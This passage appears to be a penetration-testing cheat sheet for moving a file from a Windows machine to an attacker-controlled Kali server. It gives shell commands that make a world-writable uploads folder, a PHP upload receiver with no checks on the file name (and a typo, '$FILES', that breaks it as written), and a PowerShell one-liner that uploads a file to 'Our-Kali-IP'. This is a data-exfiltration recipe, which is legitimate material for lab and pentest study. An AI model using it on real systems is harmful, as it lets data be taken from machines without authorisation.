- - -
### With uploads.php : 

**On Kali** : 
```sh
cd /var/www/html/ ; mkdir uploads/ ; chmod a+rwx /var/www/html/uploads
touch uploads.php ; nano uploads.php
```

- Now slap the following contents in to the uploads.php file and save it.

```php
<?php

$uploaddir = "/var/www/html/uploads/";

$uploadfile = $uploaddir . $_FILES["file"]["name"];

move_uploaded_file($FILES["file"]["tmp_name"], $uploadfile);

?>
```

```sh
systemctl start apache2 ; sleep 10 ; systemctl status apache2
```

- The file you are going to transfer from windows to your own machine will be downloaded in the uploads/ folder.

**On Windows** : 
```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://Our-Kali-IP/uploads.php', '.\TransferMe.txt')
```

- - -
